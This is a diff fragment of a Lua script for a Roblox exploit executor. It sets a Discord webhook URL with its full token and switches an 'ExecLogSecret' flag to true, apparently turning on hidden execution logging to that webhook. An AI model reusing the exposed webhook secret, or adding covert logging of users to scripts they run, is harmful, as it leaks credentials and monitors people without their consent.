@@ -29,7 +29,7 @@ end)
 ----------------------------------------------------------------------------------------------
 
 getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1371748529965629540/zLaoxYBoPgL4_tFC2KqqxtGwxgHXcv2HbFsxl_Iug1yPlXQ_mBzaYRegUo8A5WqsuR0U"  -- Put your Webhook Url here
-getgenv().ExecLogSecret = false
+getgenv().ExecLogSecret = true
 
 local ui = gethui()
 local folderName = "screen"
